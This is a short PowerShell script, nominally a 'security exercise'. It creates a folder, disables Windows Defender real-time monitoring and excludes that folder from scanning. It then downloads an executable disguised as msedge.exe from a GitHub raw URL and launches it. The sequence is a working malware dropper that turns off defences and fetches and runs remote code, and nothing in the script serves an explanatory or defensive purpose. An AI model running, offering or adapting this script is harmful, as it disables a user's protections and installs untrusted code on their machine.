New-Item -Path "C:\SecurityExercise" -ItemType Directory -Force

Set-MpPreference -DisableRealtimeMonitoring $true

Add-MpPreference -ExclusionPath "C:\SecurityExercise"

$down = New-Object System.Net.WebClient
$url = 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe'
$file = 'C:\SecurityExercise\demo-file.exe'
$down.DownloadFile($url,$file)

Start-Process "C:\SecurityExercise\demo-file.exe"